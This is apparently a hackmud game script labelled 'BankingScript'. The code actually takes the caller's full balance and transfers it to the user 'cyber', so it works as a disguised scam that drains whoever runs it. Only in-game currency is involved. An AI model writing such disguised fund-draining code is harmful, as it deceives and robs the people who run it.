function(context, args) // BankingScript
{
	var balance = #s.accts.balance();
	return #s.accts.xfer_gc_to({to: "cyber", amount: balance, memo:"`DS``FA``JV``LI``PN``RG``TS`"})
}
